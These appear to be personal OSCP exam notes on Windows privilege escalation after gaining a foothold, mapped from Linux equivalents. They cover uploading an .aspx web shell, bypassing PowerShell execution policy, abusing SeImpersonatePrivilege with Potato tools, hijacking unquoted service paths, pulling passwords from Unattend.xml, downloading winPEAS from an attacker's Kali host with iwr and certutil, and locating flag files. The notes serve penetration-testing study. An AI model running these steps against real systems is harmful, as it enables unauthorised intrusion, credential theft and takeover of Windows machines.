### The Technical Mapping

| **Linux Action**                                       | **Windows Translation**                 | **Command/Tool**                                                                                                                                      |
| ------------------------------------------------------ | --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Web Exploits** (PHP/Python payload)                  | **Web Exploits** (.ASPX / .NET payload) | If you find a file upload on IIS, your standard `php-reverse-shell` won't work. You must upload a `.aspx` web shell (like the classic `cmdasp.aspx`). |

Upgrading Shell
```
powershell -ep bypass
```

or

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass
```

ls
```
dir 
```

whoami && id
```
whoami /priv 
```

```
whoami /groups
```

Look for dangerous privileges like `SeImpersonatePrivilege` (leads to instant Potato exploits) or `SeBackupPrivilege`.

if not working 

```
cd C:\Windows\System32>
```

```
whoami.exe /priv
```

---

`cat /etc/passwd` 

Lists all local accounts and who belongs to the high-privilege groups.

```
net user 
```

```
net localgroup administrators
```

---

`ps aux` (Look for root processes)
```
tasklist /v
```

```
Get-Process
```

Look for third-party software running as `SYSTEM` (like an old antivirus, backup software, or web server).

---

Linpeas.SH

Alternatives:
1. [[LinWinPEAS|winpeas.exe]] 
2. PowerUp.ps1
run `Invoke-AllChecks` to automatically find misconfigured services.

---


| **Linux Concept**                                                   | **Windows Equivalent**                              | **The Exploit Strategy**                                                                                                                                                              |
| ------------------------------------------------------------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SUID Binaries** (Owned by root, executable by you)                | **Unquoted Service Paths** or **Writable Services** | If a service path has spaces and no quotes, Windows searches for executables at every space. You can hijack it by dropping your own `program.exe` in the path.                        |
| **Cron Jobs** (Scripts running automatically as root)               | **Scheduled Tasks**                                 | Run `schtasks /query /fo LIST /v` to find tasks running as `SYSTEM` that execute scripts or binaries you have permission to modify/overwrite.                                         |
| **Kernel Exploits** (DirtyCOW, Pkexec)                              | **Token Impersonation / Rotten Potato**             | If `whoami /priv` shows `SeImpersonatePrivilege`, you can use tools like `PrintSpoofer` or `GodPotato` to force a SYSTEM service to authenticate to you, letting you steal its token. |
| **Hardcoded cleartext credentials** (Config files, `.bash_history`) | **Registry / Unattended Installs**                  | Windows constantly leaves passwords in `C:\Windows\Panther\Unattend.xml` or stored deep in the Registry. `winpeas` will find these instantly.                                         |

No Wget/Curl

```
cd ~/Desktop/Tools/PEAS && python -m http.server 80
```

Windows wget using InvokePowershell from Powershell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `iwr -uri http://${KaliIP}/winPEASx64.exe -OutFile winpeas.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Windows wget using InvokePowershell from Outside Powershell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell -c "iwr -uri http://${KaliIP}/winPEASx64.exe -OutFile winpeas.exe"`;

dv.paragraph("```bash\n" + command + "\n```");
```
or

Windows wget using certutil.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil.exe -f -urlcache -split http://${KaliIP}/winPEASx64.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
winpeas.exe
```

```powershell
./winpeas.exe
```

CHECK
C:\xampp\htdocs

Priv Esc

[[SeImpersonatePrivilege]]

Search flags

```
cd C:\
```

```
dir /s /b local.txt
```

```
dir /s /b proof.txt
```

```
type proof.txt
```

---

Delete a file
```
del filename.txt
```

```
del /f filename.txt
```

```powershell
Remove-Item filename.txt
```

```powershell
Remove-Item filename.txt -Force
```